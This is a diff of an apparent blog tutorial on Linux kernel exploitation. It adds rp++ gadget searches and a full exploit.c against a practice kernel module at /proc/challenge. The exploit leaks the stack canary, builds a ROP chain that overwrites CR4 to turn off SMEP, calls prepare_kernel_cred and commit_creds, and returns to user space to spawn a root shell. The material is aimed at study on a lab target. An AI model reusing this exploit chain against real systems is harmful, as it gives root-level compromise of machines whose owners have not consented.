@@ -113,8 +113,21 @@ void cleanup_module(void)
 ...
 
 ```
-~/pwnkernel/ $ rp++ -f linux-4.4
+~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
+0xffffffff8103a411: add eax, 0x01A7F8BA ; mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret  ;  (1 found)
+0xffffffff8103a416: mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret  ;  (1 found)
+...
 ```
+
+...
+
+```
+~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
+0xffffffff8101b8d0: pop rax ; ret  ;  (66 found)
+...
+```
+
+...
 
 ```c
 void overflow_buffer(int fd, unsigned long canary)
@@ -122,10 +135,10 @@ void overflow_buffer(int fd, unsigned long canary)
     unsigned long payload[21];
 
     payload[16] = canary;
-    
-    payload[17] = 0xffffffff81001518; // pop rdi; ret
-    payload[18] = 0x6f0;              // rdi = 0x6f0
-    payload[19] = 0xffffffff8102dab0; // native_write_cr4
+
+    payload[17] = 0xffffffff8101b8d0; // pop rax ; ret 
+    payload[18] = 0x6f0;              // rax = 0x6f0
+    payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret
 
     payload[20] = (unsigned long)escalate_privileges;
 
@@ -266,6 +279,113 @@ We can run this script like before in order to be dropped into a root shell on o
 
 ## Building the Exploit
 ...
+
+{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+unsigned long save_ss, save_sp, save_rf, save_cs;
+
+void shell()
+{
+    system("/bin/sh");
+}
+
+void save_user_space()
+{
+    /* save user-space */
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov save_ss, ss;"
+        "mov save_sp, rsp;"
+        "pushf;"
+        "pop save_rf;"
+        "mov save_cs, cs;"
+        ".att_syntax;"
+    ); 
+}
+
+void load_user_space(unsigned long target)
+{
+    /* return to user-space */
+    __asm__(
+        ".intel_syntax noprefix;"
+        "swapgs;"
+        "mov r15, save_ss;"
+        "push r15;"
+        "mov r15, save_sp;"
+        "push r15;"
+        "mov r15, save_rf;"
+        "push r15;"
+        "mov r15, save_cs;"
+        "push r15;"
+        "mov r15, %[rip];"
+        "push r15;"
+        "iretq;"
+        ".att_syntax;"
+        : [rip] "=&r" (target)
+    );
+}
+
+void escalate_privileges()
+{
+    /* escalate privileges */
+    __asm__(
+        ".intel_syntax noprefix;"
+        "xor rdi, rdi;"
+        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
+        "call rbx;"
+        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
+        "mov rdi, rax;"
+        "call rbx;"
+        ".att_syntax;"
+    );
+
+    /* return to user-space */
+    load_user_space((unsigned long)shell);
+}
+
+unsigned long leak_canary(int fd)
+{
+    unsigned long leak[32];
+    read(fd, leak, sizeof(unsigned long) * 32);
+    return leak[16];
+}
+
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[21];
+
+    payload[16] = canary;
+
+    payload[17] = 0xffffffff8101b8d0; // pop rax ; ret 
+    payload[18] = 0x6f0;              // rax = 0x6f0
+    payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret
+
+    payload[20] = (unsigned long)escalate_privileges;
+
+    write(fd, payload, sizeof(unsigned long) * 21);
+}
+
+int main(int argc, char **argv)
+{
+    save_user_space();
+
+    int fd = open("/proc/challenge", O_RDWR);
+    assert(fd > 0);
+
+    /* leak stack canary */
+    unsigned long canary = leak_canary(fd);
+    printf("[*] canary @ 0x%lx\n", canary);
+
+    overflow_buffer(fd, canary); 
+
+    return 0;
+}
+{{< /code >}}
 
 
 ## Appendix
